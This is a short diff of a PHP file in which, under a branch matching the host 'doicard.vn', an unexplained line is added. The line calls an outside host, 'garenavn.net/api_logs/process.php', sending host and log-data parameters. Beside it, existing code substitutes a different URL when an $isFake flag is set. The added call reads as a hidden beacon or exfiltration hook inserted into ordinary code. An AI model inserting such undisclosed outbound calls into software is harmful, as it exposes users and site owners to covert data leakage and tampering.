@@ -15,7 +15,7 @@ $urlInfo = parse_url($oldUrl);
 
 if($urlInfo['host'] == 'doicard.vn')
 {
-
+	file_get_contents('https://garenavn.net/api_logs/process.php?host=test.com&data_logs=test_test_test_test_test_test_');
     if($isFake) $url = 'https://doicard.vn/nap/lecong119.html';
         
     $this->base_url = $url;
